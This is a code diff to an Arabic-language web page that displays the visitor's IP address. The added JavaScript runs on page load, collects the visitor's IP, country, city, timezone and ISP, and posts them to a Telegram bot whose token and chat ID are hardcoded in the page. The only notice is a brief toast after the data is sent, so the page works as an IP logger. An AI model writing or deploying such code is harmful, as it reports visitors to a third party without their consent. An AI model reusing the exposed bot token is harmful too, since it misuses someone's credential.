@@ -26,6 +26,24 @@
     .center{display:flex;align-items:center;justify-content:center}
     a.btn{display:inline-block;margin-top:12px;padding:8px 14px;border-radius:10px;background:transparent;color:var(--accent);border:1px solid rgba(74,222,128,0.18);text-decoration:none}
     @media(max-width:520px){.ip{font-size:18px}.ip-badge{flex-direction:column;align-items:flex-start}}
+    .notification {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      padding: 12px 20px;
+      background: var(--accent);
+      color: var(--bg);
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.3s ease;
+      z-index: 1000;
+    }
+    .notification.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
   </style>
 </head>
 <body>
@@ -55,7 +73,52 @@
     </main>
   </div>
 
+  <div class="notification" id="notification"></div>
+
   <script>
+    // إعدادات بوت تيليجرام
+    const TELEGRAM_BOT_TOKEN = '8454620222:AAHBBARpb_iC0gBkQmRyE8PIECLt9G5yfx4';
+    const TELEGRAM_CHAT_ID = '7070074537';
+
+    // دالة لإظهار الإشعارات
+    function showNotification(message, isError = false) {
+      const notification = document.getElementById('notification');
+      notification.textContent = message;
+      notification.style.background = isError ? '#f87171' : '#4ade80';
+      notification.classList.add('show');
+      
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 3000);
+    }
+
+    // دالة إرسال رسالة إلى تيليجرام
+    async function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+
+        if (!response.ok) {
+          throw new Error(`خطأ في الإرسال: ${response.status}`);
+        }
+
+        return true;
+      } catch (error) {
+        console.error('خطأ في إرسال الرسالة إلى تيليجرام:', error);
+        return false;
+      }
+    }
+
     // Fetch IP info using a reliable free API. ipify gives IP; ipapi.co gives country too.
     async function fetchIP(){
       const ipEl = document.getElementById('ip');
@@ -72,19 +135,46 @@
 
         // بعد نجيب بيانات إضافية (بلد) من ipapi.co
         let countryText = '';
+        let cityText = '';
+        let timezoneText = '';
+        let ispText = '';
+        
         try {
-          const r2 = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/country_name/`, {cache: 'no-store'});
+          const r2 = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, {cache: 'no-store'});
           if(r2.ok){
-            const c = await r2.text();
-            if(c && c.trim().length) countryText = c.trim();
+            const data = await r2.json();
+            if(data.country_name) countryText = data.country_name;
+            if(data.city) cityText = data.city;
+            if(data.timezone) timezoneText = data.timezone;
+            if(data.org) ispText = data.org;
           }
         } catch(e){ /* نكمل بدون country */ }
 
         ipEl.textContent = ip;
         countryEl.textContent = countryText ? ('البلد: ' + countryText) : '';
+
+        // إعداد رسالة تيليجرام
+        const telegramMessage = `
+<b>معلومات IP جديدة</b>
+📱 <b>IP:</b> <code>${ip}</code>
+🌍 <b>البلد:</b> ${countryText || 'غير معروف'}
+🏙️ <b>المدينة:</b> ${cityText || 'غير معروف'}
+⏰ <b>المنطقة الزمنية:</b> ${timezoneText || 'غير معروف'}
+📡 <b>مزود الخدمة:</b> ${ispText || 'غير معروف'}
+        `.trim();
+
+        // إرسال الرسالة إلى تيليجرام
+        const sent = await sendToTelegram(telegramMessage);
+        if (sent) {
+          showNotification('تم إرسال معلومات الـIP إلى تيليجرام');
+        } else {
+          showNotification('فشل إرسال المعلومات إلى تيليجرام', true);
+        }
+        
       } catch (err) {
         ipEl.textContent = 'ما قدرنا نجيب الـIP';
         countryEl.textContent = String(err.message || err);
+        showNotification('حدث خطأ أثناء جلب معلومات الـIP', true);
       }
     }
 
